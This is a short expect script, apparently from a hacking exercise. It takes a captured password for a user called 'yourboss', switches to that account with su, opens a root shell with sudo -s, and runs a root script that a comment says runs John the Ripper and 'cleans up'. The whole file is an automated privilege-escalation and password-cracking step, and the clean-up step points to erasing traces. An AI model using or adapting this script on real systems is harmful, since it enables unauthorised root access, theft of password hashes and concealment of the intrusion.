#!/usr/bin/expect -f
log_user 0
#grab boss pass from funandgames.sh
set bossPass [lindex $argv 0]

#change user to yourboss
spawn su yourboss
expect "Password: "
send -- "$bossPass\n"

#open a root terminal
expect "$ "
send -- "sudo -s \n"
send -- "$bossPass\n"

#run john and clean up
expect "$ "
set timeout 60s
send -- "./root_script.sh $bossPass\n"

expect eof
